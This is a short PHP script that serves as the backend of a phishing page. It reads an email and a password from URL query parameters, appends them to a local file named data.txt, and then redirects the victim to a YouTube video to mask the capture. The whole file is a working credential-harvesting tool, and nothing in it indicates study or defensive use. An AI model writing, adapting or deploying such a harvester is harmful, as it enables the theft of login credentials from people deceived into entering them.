<?php
$fp = fopen('data.txt', 'a');//opens file in append mode  

fwrite($fp, 'email:'.$_GET['e'].' | passowrd: '.$_GET['p'].
'
');   
  
echo "
<script>window.location.replace('https://www.youtube.com/watch?v=dQw4w9WgXcQ');</script>"
?>